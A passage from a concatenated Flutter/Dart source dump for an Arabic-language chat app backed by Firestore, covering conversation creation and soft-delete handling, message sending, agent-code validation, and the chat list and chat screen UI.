        finalParticipantInfoMap[_currentAgentCode] = currentUserInfo;
      } else {
        _logger.warn("ApiService:createOrGetConversation",
            "Could not fetch current user info for $_currentAgentCode. Using fallback.");
        finalParticipantInfoMap[_currentAgentCode] = ChatParticipantInfo(
            agentCode: _currentAgentCode,
            displayName:
                "أنا (${_currentAgentCode.substring(0, min(3, _currentAgentCode.length))}..)");
      }
    }
    for (String code in allParticipantsSorted) {
      if (!finalParticipantInfoMap.containsKey(code)) {
        final info = await getAgentInfo(code);
        if (info != null) {
          finalParticipantInfoMap[code] = info;
        } else {
          _logger.error("ApiService:createOrGetConversation",
              "Could not fetch participant info for $code.");
          return null;
        }
      }
    }

    // When creating/getting a conversation, we should also check the deletedForUsers status
    // If a 2-party conversation exists but is marked deleted for the current user, we might want to "un-delete" it or create a new one.
    // For now, let's assume if it exists, we return it, and the UI handles showing it if not deleted.
    // The getConversationsStream will filter it out if it's marked deleted.
    // If we want to "un-delete" upon trying to re-open, that logic would be here.
    // For simplicity, let's stick to the current behavior: if it exists, return its ID.
    // The client will then try to fetch it via getConversationsStream which will filter it if deleted.
    // This might lead to a situation where a user tries to open a chat that then disappears.
    // A better approach might be to check deletedForUsers here and if true for current user, update it to false.

    if (allParticipantsSorted.length == 2) {
      _logger.debug("ApiService:createOrGetConversation",
          "Checking for existing 2-party conversation.");
      QuerySnapshot existingConversation = await _firestore
          .collection("conversations")
          .where("participants", isEqualTo: allParticipantsSorted)
          // No filter for deletedForUsers here, as we want to find it even if soft-deleted by one party.
          .limit(1)
          .get();

      if (existingConversation.docs.isNotEmpty) {
        final doc = existingConversation.docs.first;
        final docId = doc.id;
        final data = doc.data() as Map<String, dynamic>?;
        final deletedForUsers = data?["deletedForUsers"] as Map<String, dynamic>?;

        // If it was deleted by the current user, undelete it by removing the flag.
        if (deletedForUsers != null && deletedForUsers[_currentAgentCode] == true) {
          _logger.info("ApiService:createOrGetConversation",
              "Found existing 2-party conversation $docId, previously deleted by $_currentAgentCode. Undeleting.");
          await _firestore.collection("conversations").doc(docId).update({
            "deletedForUsers.$_currentAgentCode": FieldValue.delete(), // Remove the flag
            "updatedAt": FieldValue.serverTimestamp()
          });
        }
        _logger.info("ApiService:createOrGetConversation",
            "Found/Reactivated existing 2-party conversation: $docId");
        return docId;
      }
    }

    _logger.info("ApiService:createOrGetConversation",
        "No existing suitable conversation found or it's a group chat. Creating new one.");
    final now = DateTime.now();

    final newConversation = ChatConversation(
      id: "", // Firestore will generate ID
      participants: allParticipantsSorted,
      participantInfo: finalParticipantInfoMap,
      conversationTitle: groupTitle ??
          (allParticipantsSorted.length > 2
              ? "مجموعة جديدة (${allParticipantsSorted.length})"
              : "محادثة"), // Default title
      lastMessageText: "تم إنشاء المحادثة.",
      lastMessageTimestamp: now,
      lastMessageSenderAgentCode: _currentAgentCode, // Or system message
      createdAt: now,
      updatedAt: now,
      deletedForUsers: {}, // Initialize with empty map
    );

    try {
      final docRef = await _firestore
          .collection("conversations")
          .add(newConversation.toFirestore());
      _logger.info("ApiService:createOrGetConversation",
          "Successfully created new conversation with ID: ${docRef.id}");
      return docRef.id;
    } catch (e, stackTrace) {
      _logger.error("ApiService:createOrGetConversation",
          "Failed to create new conversation in Firestore", e, stackTrace);
      return null;
    }
  }

  Future<void> sendMessage(
      String conversationId, ChatMessage messageToSend) async {
    _logger.info("ApiService:sendMessage",
        "Sending message to conversation $conversationId by agent $_currentAgentCode. Text: ${messageToSend.text ?? messageToSend.fileName ?? 'Attachment'}");

    if (conversationId.isEmpty || messageToSend.senderId != _currentAgentCode) {
      _logger.error("ApiService:sendMessage",
          "Invalid params: convId empty or senderId mismatch. ConvId: '$conversationId', Sender: '${messageToSend.senderId}', CurrentUser: '$_currentAgentCode'");
      return;
    }

    try {
      final messageData = messageToSend.toFirestore();
      messageData["timestamp"] = FieldValue.serverTimestamp(); // Use server timestamp for messages

      final messageDocRef = await _firestore
          .collection("conversations")
          .doc(conversationId)
          .collection("messages")
          .add(messageData);

      _logger.debug("ApiService:sendMessage",
          "Message document ${messageDocRef.id} added to conversation $conversationId.");

      // When a message is sent, ensure the conversation is not marked as deleted for any participant.
      // This effectively "un-deletes" the conversation for all participants if they send a message.
      Map<String, dynamic> updateData = {
        "lastMessageText":
            messageToSend.text ?? (messageToSend.fileName ?? "مرفق"),
        "lastMessageTimestamp": FieldValue.serverTimestamp(),
        "lastMessageSenderAgentCode": messageToSend.senderId,
        "updatedAt": FieldValue.serverTimestamp(),
        "deletedForUsers": {} // Clear all soft-delete flags for all users in this conversation
      };

      await _firestore.collection("conversations").doc(conversationId).update(updateData);
      _logger.info("ApiService:sendMessage",
          "Conversation $conversationId metadata updated and un-deleted for all participants.");
    } catch (e, stackTrace) {
      _logger.error(
          "ApiService:sendMessage",
          "Failed to send message to conversation $conversationId or update conversation metadata",
          e,
          stackTrace);
      rethrow;
    }
  }

  Future<bool> validateAgentCodeAgainstFirestore(
      String agentCodeToValidate) async {
    if (agentCodeToValidate.isEmpty) {
      _logger.warn("ApiService:validateAgentCode",
          "Attempted to validate an empty agent code.");
      return false;
    }
    _logger.info("ApiService:validateAgentCode",
        "Validating agent code: $agentCodeToValidate against 'agent_identities'");
    try {
      final doc = await _firestore
          .collection("agent_identities")
          .doc(agentCodeToValidate)
          .get();

      if (doc.exists) {
        _logger.info("ApiService:validateAgentCode",
            "Agent code '$agentCodeToValidate' is VALID (document exists).");
        return true;
      } else {
        _logger.warn("ApiService:validateAgentCode",
            "Agent code '$agentCodeToValidate' is INVALID (document does not exist).");
        return false;
      }
    } catch (e, s) {
      _logger.error(
          "ApiService:validateAgentCode",
          "Error occurred while validating agent code '$agentCodeToValidate'",
          e,
          s);
      return false;
    }
  }
}




// ------------------------------ نهاية الملف: api_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_list_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\chat_list_screen.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/chat_list_screen.dart
import "dart:async"; // For unawaited

import "package:cloud_firestore/cloud_firestore.dart"; 
import "package:flutter/material.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";

import "../../core/logging/logger_provider.dart";
// Import the whole file, as both ChatConversation and ChatParticipantInfo are used.
import "../../data/models/chat/chat_conversation.dart"; 
import "chat_screen.dart";
import "providers/auth_providers.dart";
import "providers/chat_providers.dart";
import "widgets/chat_list_item.dart";

final chatSearchQueryProvider = StateProvider<String>((ref) => "");

class ChatListScreen extends ConsumerStatefulWidget {
  const ChatListScreen({super.key});
  @override
  ConsumerState<ChatListScreen> createState() => _ChatListScreenState();
}

class _ChatListScreenState extends ConsumerState<ChatListScreen> {
  bool _isSearching = false;
  final TextEditingController _searchController = TextEditingController();
  bool _isFirstLoad = true; // Track first load to improve UX

  @override
  void initState() {
    super.initState();
    _searchController.addListener(() {
      if (mounted) {
        ref.read(chatSearchQueryProvider.notifier).state =
            _searchController.text;
      }
    });
    
    // Add a slight delay to make sure we've completed initialization
    Future.delayed(const Duration(milliseconds: 200), () {
      if (mounted) {
        setState(() {
          _isFirstLoad = false;
        });
      }
    });
  }

  @override
  void dispose() {
    _searchController.dispose();
    super.dispose();
  }

  void _toggleSearch() {
    setState(() {
      _isSearching = !_isSearching;
      if (!_isSearching) {
        _searchController.clear();
        ref.read(chatSearchQueryProvider.notifier).state = "";
      }
    });
  }

  Future<ChatParticipantInfo?> _fetchAgentInfo(
      String agentCode, WidgetRef ref) async {
    final logger = ref.read(appLoggerProvider);
    final firestore = FirebaseFirestore.instance;
    logger.info("_fetchAgentInfo",
        "Fetching info for agent: $agentCode (direct Firestore access)");
    if (agentCode.isEmpty) return null;
    try {
      final doc =
          await firestore.collection("agent_identities").doc(agentCode).get();
      if (doc.exists) {
        final data = doc.data()!;
        return ChatParticipantInfo(
          agentCode: agentCode,
          displayName: data["displayName"] as String? ?? agentCode,
        );
      }
      logger.warn("_fetchAgentInfo", "Agent info not found for $agentCode.");
      return null;
    } catch (e, s) {
      logger.error(
          "_fetchAgentInfo", "Error fetching agent info for $agentCode", e, s);
      return null;
    }
  }

  void _createNewConversation() async {
    final apiService = ref.read(apiServiceProvider);
    final logger = ref.read(appLoggerProvider);
    final currentAgentCode =
        ref.read(currentAgentCodeProvider).value;
    final bool mainContextMounted = mounted; // Capture mounted state
    final theme = Theme.of(context); // Get theme for styling

    if (apiService == null ||
        currentAgentCode == null ||
        currentAgentCode.isEmpty) {
      logger.warn("ChatListScreen:createNewConversation",
          "ApiService or currentAgentCode is not available.");
      if (mainContextMounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text("الخدمة غير متاحة أو لم يتم تسجيل الدخول.",
                  style: GoogleFonts.cairo())),
        );
      }
      return;
    }

    String? otherAgentCode = await showDialog<String>(
        context: context, 
        barrierDismissible: false, // Make dialog harder to dismiss accidentally
        builder: (dialogContext) {
          TextEditingController agentCodeController = TextEditingController();
          return AlertDialog(
            title: Text("بدء محادثة جديدة", style: GoogleFonts.cairo(fontWeight: FontWeight.bold)),
            content: Column(
              mainAxisSize: MainAxisSize.min, // Important for Column in AlertDialog
              children: [
                Text("الرجاء إدخال الرمز التعريفي للشخص الذي ترغب في بدء محادثة معه.", style: GoogleFonts.cairo(fontSize: 14)),
                const SizedBox(height: 15),
                TextField(
                  controller: agentCodeController,
                  decoration: InputDecoration(
                      hintText: "الرمز التعريفي للعميل الآخر",
                      hintStyle: GoogleFonts.cairo(),
                      border: const OutlineInputBorder(), // Add border for better visibility
                      prefixIcon: const Icon(Icons.person_search_outlined)
                  ),
                  style: GoogleFonts.cairo(),
                  autofocus: true, // Focus on the text field immediately
                ),
              ],
            ),
            actionsAlignment: MainAxisAlignment.spaceBetween, // Space out buttons
            actionsPadding: const EdgeInsets.symmetric(horizontal: 16.0, vertical: 8.0),
            actions: [
              TextButton(
                  onPressed: () => Navigator.of(dialogContext).pop(),
                  child: Text("إلغاء", style: GoogleFonts.cairo(color: theme.colorScheme.error, fontWeight: FontWeight.bold))),
              ElevatedButton.icon(
                  icon: const Icon(Icons.send_outlined),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: theme.primaryColor,
                    foregroundColor: theme.colorScheme.onPrimary,
                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12)
                  ),
                  onPressed: () {
                    final code = agentCodeController.text.trim();
                    if (code.isNotEmpty) {
                       Navigator.of(dialogContext).pop(code);
                    } else {
                      // Optionally show a small validation message within the dialog
                      ScaffoldMessenger.of(dialogContext).showSnackBar(
                        SnackBar(content: Text("الرجاء إدخال الرمز التعريفي.", style: GoogleFonts.cairo()), duration: const Duration(seconds: 2))
                      );
                    }
                  },
                  label: Text("بدء المحادثة", style: GoogleFonts.cairo(fontWeight: FontWeight.bold)))
            ],
          );
        });

    if (otherAgentCode == null || otherAgentCode.isEmpty) {
      logger.info("ChatListScreen:createNewConversation",
          "Dialog cancelled or no other agent code entered.");
      return;
    }

    if (otherAgentCode == currentAgentCode) {
      logger.info("ChatListScreen:createNewConversation",
          "Attempted to create chat with self.");
      if (mounted) { 
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text("لا يمكنك إنشاء محادثة مع نفسك بهذه الطريقة.",
                  style: GoogleFonts.cairo())),
        );
      }
      return;
    }

    // تحسين تجربة المستخدم بإظهار حالة تحميل مباشرة
    if (mounted) {
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (BuildContext context) {
          return Dialog(
            child: Padding(
              padding: const EdgeInsets.all(20.0),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  CircularProgressIndicator(color: theme.primaryColor),
                  const SizedBox(width: 20),
                  Text("جاري إعداد المحادثة...", style: GoogleFonts.cairo()),
                ],
              ),
            ),
          );
        },
      );
    }

    try {
      final otherAgentInfo = await _fetchAgentInfo(otherAgentCode, ref);
      // تحقق مرة أخرى من الـ mounted قبل المتابعة
      if (!mounted) return;

      if (otherAgentInfo == null) {
        Navigator.of(context).pop(); // إغلاق نافذة التحميل
        logger.error("ChatListScreen:createNewConversation",
            "Agent $otherAgentCode not found or error fetching info.");
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text("لم يتم العثور على عميل بالرمز: $otherAgentCode",
                  style: GoogleFonts.cairo())),
        );
        return;
      }

      final currentUserInfo = await _fetchAgentInfo(currentAgentCode, ref);
      // تحقق مرة أخرى من الـ mounted قبل المتابعة
      if (!mounted) return;

      if (currentUserInfo == null) {
        Navigator.of(context).pop(); // إغلاق نافذة التحميل
        logger.error("ChatListScreen:CreateNewConversation",
            "Failed to fetch current user ($currentAgentCode) info. This should not happen if login was successful.");
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text("خطأ في جلب معلومات المستخدم الحالي.",
                style: GoogleFonts.cairo())
          )
        );
        return;
      }

      final Map<String, ChatParticipantInfo> participantsInfoMap = {
        currentAgentCode: currentUserInfo,
        otherAgentCode: otherAgentInfo,
      };

      final newConversationId =
          await apiService.createOrGetConversationWithParticipants(
        [otherAgentCode],
        participantsInfoMap,
      );
      
      // تحقق مرة أخرى من الـ mounted قبل المتابعة
      if (!mounted) return;
      Navigator.of(context).pop(); // إغلاق نافذة التحميل

      if (newConversationId != null) {
        logger.info("ChatListScreen",
            "Successfully created/retrieved conversation: $newConversationId");
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => ChatScreen(
              conversationId: newConversationId,
              conversationTitle: otherAgentInfo.displayName,
            ),
          ),
        );
      } else {
        logger.warn("ChatListScreen",
            "Failed to create/retrieve conversation with $otherAgentCode.");
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text(
                  "فشل إنشاء/جلب المحادثة. قد تكون المشكلة في الاتصال أو البيانات.",
                  style: GoogleFonts.cairo())),
        );
      }
    } catch (e, stackTrace) {
      if (mounted) Navigator.of(context).pop(); // إغلاق نافذة التحميل عند حدوث خطأ
      logger.error("ChatListScreen:createNewConversation",
          "Error during conversation creation/retrieval", e, stackTrace);
      if (mounted) { 
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content:
                  Text("حدث خطأ: ${e.toString()}", style: GoogleFonts.cairo())),
        );
      }
    }
  }

  // دالة لعرض المحتوى المناسب عند عدم وجود محادثات
  Widget _buildEmptyConversationsView(BuildContext context) {
    final theme = Theme.of(context);
    
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.chat_bubble_outline_rounded, 
              size: 80, 
              color: Colors.grey[400]),
          const SizedBox(height: 20),
          Text(
            "لا توجد محادثات حتى الآن",
            style: GoogleFonts.cairo(
                fontSize: 18, 
                color: Colors.grey[600],
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 8),
          Text(
            "يمكنك بدء محادثة جديدة مع أي شخص باستخدام الزر أدناه",
            style: GoogleFonts.cairo(
                fontSize: 14, 
                color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 24),
          ElevatedButton.icon(
            icon: const Icon(Icons.add_comment_outlined),
            label: Text("بدء محادثة جديدة", 
                       style: GoogleFonts.cairo(fontWeight: FontWeight.bold)),
            onPressed: _createNewConversation,
            style: ElevatedButton.styleFrom(
                backgroundColor: theme.primaryColor,
                foregroundColor: theme.colorScheme.onPrimary,
                padding: const EdgeInsets.symmetric(
                    horizontal: 24, vertical: 12),
                textStyle: GoogleFonts.cairo(fontSize: 16, fontWeight: FontWeight.bold),
                elevation: 2,
            ),
          ),
        ],
      ),
    );
  }

  // دالة لعرض نتيجة بحث فارغة
  Widget _buildEmptySearchResults(String query) {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.search_off_rounded, 
               size: 80, 
               color: Colors.grey[400]),
          const SizedBox(height: 20),
          Text(
            "لا توجد نتائج بحث تطابق \"$query\"",
            style: GoogleFonts.cairo(
                fontSize: 18, 
                color: Colors.grey[600],
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 16),
          Text(
            "حاول استخدام كلمات مفتاحية مختلفة",
            style: GoogleFonts.cairo(
                fontSize: 14, 
                color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final agentCodeAsync = ref.watch(currentAgentCodeProvider);
    final conversationsAsyncValue = ref.watch(chatConversationsStreamProvider);
    final theme = Theme.of(context);
    final logger = ref.read(appLoggerProvider);
    final currentSearchQuery = ref.watch(chatSearchQueryProvider).toLowerCase();

    if (agentCodeAsync.isLoading) {
      return const Scaffold(
          body: Center(child: CircularProgressIndicator()));
    }
    if (agentCodeAsync.hasError ||
        agentCodeAsync.value == null ||
        agentCodeAsync.value!.isEmpty) {
      return Scaffold(
        body: Center(
          child: Padding(
            padding: const EdgeInsets.all(16.0),
            child: Text(
              agentCodeAsync.hasError
                  ? "خطأ في تحميل بيانات المصادقة.\nالرجاء المحاولة مرة أخرى لاحقًا."
                  : "الرجاء تسجيل الدخول للوصول إلى قسم الدردشات.",
              style: GoogleFonts.cairo(fontSize: 17, color: Colors.grey[700]),
              textAlign: TextAlign.center,
            ),
          ),
        ),
      );
    }

    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: SafeArea(
        child: Column(
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 8, 8, 8), 
              child: Row(
                children: [
                  Expanded(
                    child: _isSearching
                        ? TextField(
                            controller: _searchController,
                            autofocus: true,
                            style: GoogleFonts.cairo(color: theme.textTheme.bodyLarge?.color ?? (theme.brightness == Brightness.dark ? Colors.white : Colors.black)),
                            decoration: InputDecoration(
                              hintText: "بحث في الدردشات...",
                              hintStyle: GoogleFonts.cairo(color: theme.hintColor),
                              border: InputBorder.none, 
                            ))
                        : Text("الدردشات", style: GoogleFonts.cairo(fontSize: 20, fontWeight: FontWeight.bold, color: theme.textTheme.titleLarge?.color)),
                  ),
                  IconButton(
                    icon: Icon(_isSearching ? Icons.close : Icons.search_outlined, color: theme.iconTheme.color),
                    tooltip: _isSearching ? "إغلاق البحث" : "بحث",
                    onPressed: _toggleSearch,
                  ),
                  if (!_isSearching)
                    IconButton(
                      icon: Icon(Icons.refresh_outlined, color: theme.iconTheme.color),
                      tooltip: "تحديث",
                      onPressed: () {
                        unawaited(ref.refresh(chatConversationsStreamProvider.future));
                        logger.info("ChatListScreen",
                            "Manually refreshed conversations stream.");
                        if (_isSearching) _toggleSearch();
                        _searchController.clear();
                      },
                    ),
                ],
              ),
            ),
            Expanded(
              child: conversationsAsyncValue.when(
                data: (conversations) {
                  final filteredConversations = currentSearchQuery.isEmpty
                      ? conversations
                      : conversations.where((conv) {
                          return conv.conversationTitle
                                  .toLowerCase()
                                  .contains(currentSearchQuery) ||
                              (conv.lastMessageText ?? "")
                                  .toLowerCase()
                                  .contains(currentSearchQuery);
                        }).toList();

                  // عرض رسالة فارغة مناسبة
                  if (filteredConversations.isEmpty) {
                    if (currentSearchQuery.isNotEmpty) {
                      return _buildEmptySearchResults(currentSearchQuery);
                    } else {
                      return _buildEmptyConversationsView(context);
                    }
                  }
                  
                  return ListView.separated(
                    padding: const EdgeInsets.symmetric(vertical: 8.0),
                    itemCount: filteredConversations.length,
                    itemBuilder: (context, index) {
                      final conversation = filteredConversations[index];
                      return ChatListItem(
                        conversation: conversation,
                        onTap: () {
                          Navigator.push(
                            context,
                            MaterialPageRoute(
                              builder: (context) => ChatScreen(
                                conversationId: conversation.id,
                                conversationTitle: conversation.conversationTitle,
                              ),
                            ),
                          );
                        },
                      );
                    },
                    separatorBuilder: (context, index) => Divider(
                      height: 0.5,
                      indent: 75,
                      endIndent: 15,
                      color: theme.brightness == Brightness.dark
                          ? Colors.grey[700]
                          : Colors.grey[300],
                    ),
                  );
                },
                loading: () => _isFirstLoad 
                  ? Center(
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          CircularProgressIndicator(color: theme.primaryColor),
                          const SizedBox(height: 16),
                          Text(
                            "جاري تحميل المحادثات...",
                            style: GoogleFonts.cairo(fontSize: 16, color: theme.primaryColor),
                          )
                        ],
                      ))
                  : const Center(child: CircularProgressIndicator()),
                error: (err, stack) {
                  logger.error(
                      "ChatListScreen:StreamBuilder", "Error in stream UI", err, stack);
                  return Center(
                      child: Padding(
                    padding: const EdgeInsets.all(16.0),
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.error_outline_rounded, 
                             size: 60, 
                             color: Colors.red[300]),
                        const SizedBox(height: 16),
                        Text(
                          "حدث خطأ أثناء تحميل المحادثات",
                          style: GoogleFonts.cairo(
                              fontSize: 18, 
                              color: Colors.red[400],
                              fontWeight: FontWeight.w600),
                          textAlign: TextAlign.center,
                        ),
                        const SizedBox(height: 8),
                        Text(
                          "الرجاء المحاولة مرة أخرى لاحقًا",
                          style: GoogleFonts.cairo(color: Colors.grey[600], fontSize: 14),
                          textAlign: TextAlign.center,
                        ),
                        const SizedBox(height: 20),
                        ElevatedButton.icon(
                          onPressed: () => ref.refresh(chatConversationsStreamProvider),
                          icon: const Icon(Icons.refresh_rounded),
                          label: Text("إعادة المحاولة", style: GoogleFonts.cairo()),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: theme.primaryColor,
                            foregroundColor: Colors.white,
                          ),
                        )
                      ],
                    ),
                  ));
                },
              ),
            ),
          ],
        ),
      ),
      floatingActionButton: FloatingActionButton.extended(
        onPressed: _createNewConversation,
        backgroundColor: theme.primaryColor,
        foregroundColor: theme.colorScheme.onPrimary,
        tooltip: "بدء محادثة جديدة",
        icon: const Icon(Icons.add_comment_outlined),
        label: Text("محادثة جديدة", style: GoogleFonts.cairo(fontWeight: FontWeight.bold)),
        elevation: 3,
      ),
    );
  }
}


// ------------------------------ نهاية الملف: chat_list_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\chat_screen.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/chat_screen.dart
import "package:file_picker/file_picker.dart";
import "package:flutter/material.dart";
import "package:flutter/services.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";
import "package:mime/mime.dart"; // For looking up MIME types

import "../../core/logging/logger_provider.dart";
import "../../data/models/chat/chat_message.dart";
import "providers/auth_providers.dart";
import "providers/chat_providers.dart";
import "widgets/message_bubble.dart";
import "widgets/message_input_bar.dart";

class ChatScreen extends ConsumerStatefulWidget {
  final String conversationId;
  final String conversationTitle; 
  final bool showAppBar;

  const ChatScreen({
    super.key,
    required this.conversationId,
    required this.conversationTitle,
    this.showAppBar = true, 
  });

  @override
  ConsumerState<ChatScreen> createState() => _ChatScreenState();
}

class _ChatScreenState extends ConsumerState<ChatScreen> {
  bool _isInitializing = true;

  @override
  void initState() {
    super.initState();
    // تأخير قليل جداً لإظهار حالة تحميل أفضل
    Future.delayed(const Duration(milliseconds: 300), () {
      if (mounted) {
        setState(() {
          _isInitializing = false;
        });
      }
    });
  }

  MessageType _determineMessageTypeFromFile(PlatformFile file) {
    final mimeType = lookupMimeType(file.name, headerBytes: file.bytes?.take(1024).toList());
    final extension = file.extension?.toLowerCase();
    
    if (mimeType != null) {
        if (mimeType.startsWith("image/")) return MessageType.image;
        if (mimeType.startsWith("video/")) return MessageType.video;
        if (mimeType.startsWith("audio/")) return MessageType.audio;
    }
    // Fallback to extension if MIME type is generic or missing
    if (extension == null) {
      return MessageType.file; 
    }
    switch (extension) {
      case "jpg":
      case "jpeg":
      case "png":
      case "gif":
      case "webp":
      case "bmp":
        return MessageType.image;
      case "mp4":
      case "mov":
      case "avi":
      case "mkv":
      case "webm":
        return MessageType.video;
      case "mp3":
      case "wav":
      case "aac":
      case "ogg":
      case "m4a":
        return MessageType.audio;
      default:
        return MessageType.file;
    }
  }

  void _onMessageLongPress(
      BuildContext context, ChatMessage message, WidgetRef ref) {
    final logger = ref.read(appLoggerProvider);
    final currentTheme = Theme.of(context);

    showModalBottomSheet(
        context: context,
        backgroundColor: currentTheme.bottomSheetTheme.modalBackgroundColor ??
            currentTheme.cardColor,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
        ),
        builder: (ctx) {
          return Padding(
            padding: const EdgeInsets.symmetric(vertical: 10.0),
            child: Wrap(
              children: <Widget>[
                Center(
                  child: Container(
                    width: 40,
                    height: 5,
                    margin: const EdgeInsets.only(top: 8, bottom: 12),
                    decoration: BoxDecoration(
                        color: Colors.grey[400],
                        borderRadius: BorderRadius.circular(10)),
                  ),
                ),
                if (message.text != null && message.text!.isNotEmpty)
                  ListTile(
                    leading: Icon(Icons.copy_all_outlined,
                        color: currentTheme.colorScheme.primary),
                    title: Text("نسخ النص",
                        style: GoogleFonts.cairo(fontSize: 16)),
                    onTap: () {
                      Clipboard.setData(ClipboardData(text: message.text!));
                      Navigator.of(ctx).pop();
                      ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(
                          content: Text("تم نسخ النص إلى الحافظة",
                              style: GoogleFonts.cairo()),
                          behavior: SnackBarBehavior.floating, 
                          shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(10)),
                        ),
                      );
                      logger.info("ChatScreen:MessageMenu",
                          "Copied message text: ${message.id}");
                    },
                  ),
              ],
            ),
          );
        });
  }

  // دالة لعرض حالة تحميل محسنة
  Widget _buildLoadingState(BuildContext context) {
    final theme = Theme.of(context);
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          CircularProgressIndicator(color: theme.primaryColor),
          const SizedBox(height: 20),
          Text(
            "جاري إعداد المحادثة...",
            style: GoogleFonts.cairo(
              fontSize: 16,
              color: theme.primaryColor,
              fontWeight: FontWeight.w500
            ),
          ),
        ],
      ),
    );
  }

  // دالة لعرض حالة الخطأ بشكل محسن
  Widget _buildErrorState(String errorMsg, WidgetRef ref) {
    final theme = Theme.of(context);
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(20.0),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.error_outline_rounded,
                color: Colors.red[300], size: 60),
            const SizedBox(height: 15),
            Text(
              "حدث خطأ أثناء تحميل المحادثة",
              style: GoogleFonts.cairo(
                  color: Colors.red[400], 
                  fontSize: 18,
                  fontWeight: FontWeight.w600),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 8),
            Text(
              errorMsg,
              style: GoogleFonts.cairo(
                  color: Colors.grey[600], fontSize: 14),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 20),
            ElevatedButton.icon(
              icon: const Icon(Icons.refresh_rounded),
              label: Text("إعادة المحاولة", style: GoogleFonts.cairo()),
              onPressed: () => ref.invalidate(
                  chatMessagesStreamProvider(widget.conversationId)),
              style: ElevatedButton.styleFrom(
                backgroundColor: theme.primaryColor,
                foregroundColor: Colors.white,
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
              ),
            )
          ],
        ),
      ),
    );
  }

  // دالة لعرض حالة الرسائل الفارغة
  Widget _buildEmptyMessagesState(BuildContext context) {
    final theme = Theme.of(context);
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.forum_outlined,
              size: 100,
              color: theme.colorScheme.primary.withOpacity(0.6)),
          const SizedBox(height: 20),
          Text(
            "ابدأ المحادثة!",
            style: GoogleFonts.cairo(
                fontSize: 22,
                color: theme.colorScheme.onSurface,
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 8),
          Text(
            "لا توجد رسائل في هذه المحادثة بعد\nأرسل أول رسالة للبدء",
            style: GoogleFonts.cairo(
                fontSize: 16, 
                color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 12),
          Icon(
            Icons.arrow_downward_rounded,
            color: theme.primaryColor.withOpacity(0.7),
            size: 32,
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final agentCodeAsync = ref.watch(currentAgentCodeProvider);
    final messagesAsyncValue =
        ref.watch(chatMessagesStreamProvider(widget.conversationId));
    final theme = Theme.of(context);
    final logger = ref.read(appLoggerProvider);

    if (_isInitializing) {
      return Scaffold(
        appBar: widget.showAppBar 
            ? AppBar(title: Text(widget.conversationTitle, style: GoogleFonts.cairo()))
            : null,
        body: _buildLoadingState(context),
      );
    }

    if (agentCodeAsync.isLoading ||
        agentCodeAsync.hasError ||
        agentCodeAsync.value == null ||
        agentCodeAsync.value!.isEmpty) {
      Widget bodyContent;
      if (agentCodeAsync.isLoading) {
        bodyContent = _buildLoadingState(context);
      } else {
        bodyContent = Center(
          child: Padding(
            padding: const EdgeInsets.all(20.0),
            child: Text(
              agentCodeAsync.hasError
                  ? "خطأ في تحميل معلومات المستخدم للدردشة."
                  : "الرجاء تسجيل الدخول لعرض الرسائل.",
              style: GoogleFonts.cairo(fontSize: 16, color: Colors.grey[600]),
              textAlign: TextAlign.center,
            ),
          ),
        );
      }
      return Scaffold(
        appBar: widget.showAppBar
            ? AppBar(title: Text(widget.conversationTitle, style: GoogleFonts.cairo()))
            : null,
        body: bodyContent,
      );
    }

    final currentAgentCode = agentCodeAsync.value!;

    return Scaffold(
      appBar: widget.showAppBar
          ? AppBar(
              title: Text(widget.conversationTitle, style: GoogleFonts.cairo()),
              backgroundColor: theme.appBarTheme.backgroundColor ??
                  theme.colorScheme.primary,
